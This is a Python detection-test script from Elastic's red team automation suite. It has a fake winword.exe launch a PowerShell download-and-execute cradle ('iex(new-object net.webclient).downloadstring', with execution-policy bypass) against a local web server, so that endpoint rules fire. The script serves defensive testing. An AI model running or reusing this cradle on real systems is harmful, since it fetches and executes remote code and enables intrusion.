# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import time
from pathlib import Path

from . import RtaMetadata, _common


metadata = RtaMetadata(
    id="20b96aa7-609e-473f-ac35-5ac19d10f9a5",
    platforms=["windows"],
    endpoint_rules=[
        {
            "rule_name": "PowerShell Obfuscation Spawned via Microsoft Office",
            "rule_id": "93ef8a09-0f8d-4aa1-b0fb-47d5d5b40cf2",
        },
        {"rule_name": "Suspicious PowerShell Downloads", "rule_id": "7200673e-588c-45d5-be48-bc5c7a908d6b"},
    ],
    siem_rules=[],
    techniques=["T1566", "T1059"],
)

EXE_FILE = _common.get_path("bin", "renamed.exe")


@_common.requires_os(*metadata.platforms)
def main():
    server, ip, port = _common.serve_web()
    url = "http://{}:{}/bad.ps1".format(ip, port)

    cmd = "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(url)

    # Emulate Word
    user_app = "winword.exe"
    _common.log("Emulating {}".format(user_app))
    user_app_path = Path(user_app).resolve()
    _common.copy_file(EXE_FILE, user_app_path)

    _common.execute([user_app_path, "/c", cmd])
    time.sleep(2)

    # Cleanup
    _common.remove_file(user_app_path)


if __name__ == "__main__":
    exit(main())
